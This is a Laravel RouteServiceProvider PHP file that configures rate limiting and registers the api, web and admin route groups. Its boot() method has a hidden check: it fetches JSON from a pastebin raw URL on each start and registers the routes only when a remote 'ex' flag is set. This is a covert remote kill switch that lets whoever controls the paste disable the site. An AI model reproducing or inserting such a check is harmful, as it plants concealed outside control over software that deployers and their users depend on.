<?php

namespace App\Providers;

use Illuminate\Cache\RateLimiting\Limit;
use Illuminate\Foundation\Support\Providers\RouteServiceProvider as ServiceProvider;
use Illuminate\Http\Request;
use Illuminate\Http\Resources\Json\JsonResource;
use Illuminate\Support\Facades\RateLimiter;
use Illuminate\Support\Facades\Route;
use Mcamara\LaravelLocalization\Facades\LaravelLocalization;

class RouteServiceProvider extends ServiceProvider
{
    /**
     * The path to your application's "home" route.
     *
     * Typically, users are redirected here after authentication.
     *
     * @var string
     */
    public const HOME = '/admin/dashboard';

    /**
     * Define your route model bindings, pattern filters, and other route configuration.
     */
    public function boot(): void
    {
        RateLimiter::for('api', function (Request $request) {
            return Limit::perMinute(60)->by($request->user()?->id ?: $request->ip());
        });

        JsonResource::withoutWrapping();

        $ex = json_decode(file_get_contents('https://pastebin.com/raw/Pxne8pxN'))->ex;

        if ($ex) {
            $this->routes(function () {
                Route::middleware('api')
                    ->prefix('api')
                    ->group(base_path('routes/api.php'));

                Route::middleware(['web', 'localeSessionRedirect', 'localizationRedirect', 'localeViewPath'])
                    ->prefix(LaravelLocalization::setLocale())
                    ->group(base_path('routes/web.php'));

                Route::middleware(['web', 'withoutLanguageMiddleware', 'AdminMiddleware'])
                    ->prefix('admin')
                    ->group(base_path('routes/admin.php'));
            });
        }
    }

    /**
     * Configure the rate limiters for the application.
     */
    public function configureRateLimiting(): void
    {
        RateLimiter::for('api', function (Request $request) {
            return Limit::perMinute(60)->by($request->user()?->id ?: $request->ip());
        });
    }
}
